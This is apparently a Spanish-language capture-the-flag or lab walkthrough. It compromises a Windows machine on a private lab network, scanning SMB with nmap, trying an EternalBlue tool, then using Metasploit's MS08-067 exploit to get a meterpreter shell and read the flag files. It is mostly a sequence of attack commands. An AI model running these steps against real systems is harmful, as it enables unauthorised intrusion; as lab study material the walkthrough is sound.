
IP local: 10.0.22.4
IP remota: 10.0.22.6
***Abrimos consola***
- netdiscover -r 10.0.22.0/24
	- *Descubrimos que ip sale que no es usual*	
- nmap -p445 --script="smb-vuln-*" 10.0.22.6
- **PROBAMOS EL WIN7BLUE**
- cd /home/user/Desktop/Win7Blue
- chmod +x Win7Blue
- ./Win7Blue
	- $:1
	- RHOST: (Ip remota u del objeto)
- ./Win7Blue
	- $: **4** (o 3, dependiendo de la arquitectura del sistema)
	- RHOST: (ip remota u objetivo)
	- LHOST(ip local, ya sea kali o host usado)
	- LPORT: (puerto en escucha de la consola abierta)
	- *Darle a enter*
- Vemos que no funciona este método, así que recurrimos al otro con el metasploit:


- Buscamos la vulnerabilidad con el comando nmap:
- nmap -p445 --script="smb-vuln-*" 10.0.22.6
- ![Pasted image 20241009183608](https://github.com/user-attachments/assets/c32e00df-f754-439f-b292-147c71c84497)
  
- searchsploit MS08-067
- ![Pasted image 20241009183946](https://github.com/user-attachments/assets/76787312-2e7d-461b-9938-ff3b39777006)
  
- msfconsole
- search MS08-067
- use 0
- show options
- ![Pasted image 20241009184040](https://github.com/user-attachments/assets/74143a1e-1cad-4415-a660-cd2d161043d6)
  
-  set rhosts 10.0.22.6
- show options
- ![Pasted image 20241009184121](https://github.com/user-attachments/assets/85a24e73-9f71-4821-912c-92b66427865b)
  
- Exploit:
	- En este caso, no funciona ya que no se puede llegar, así que se hará una modificación de los puertos locales:
	- ![Pasted image 20241009184247](https://github.com/user-attachments/assets/030cc503-5ac2-4686-84cf-9913dff3e508)
   
- Exploit:
	- De nuevo no funciona, así que le cambiamos de nuevo el puerto:
	- ![Pasted image 20241009184353](https://github.com/user-attachments/assets/f475be53-419b-4c72-8aca-eb027f1e5973)
   
- Exploit
	- En este caso, ya ha funcionado.
- *Cuando sale el meterpreter:*
- shell
- **En este momento, ya hemos entrado al shell de la máquina vulnerable**
- dir
- dir C:\\![Pasted image 20241009184547](https://github.com/user-attachments/assets/7c56b549-809d-408b-986c-a80c155c524f)
  
- cd C:\\Documents and Settings
- dir C:\\Documents and Settings![Pasted image 20241009184616](https://github.com/user-attachments/assets/47891447-2c1e-4969-86f5-89854f5c1183)
  
- cd C:\\Documents and Settings\\bill
- dir C:\\Documents and Settings\\bill![Pasted image 20241009184654](https://github.com/user-attachments/assets/80200e24-3665-4b5d-bd2b-996a908a15c9)

- C:\\Documents and Settings\\bill\\Desktop![Pasted image 20241009184712](https://github.com/user-attachments/assets/b06888e4-266f-4ed0-a7c2-9f1e4207452a)

- type root.txt
- type user.txt
- ![Pasted image 20241009184745](https://github.com/user-attachments/assets/13cc4202-a09a-443a-b075-1d27c90ef032)




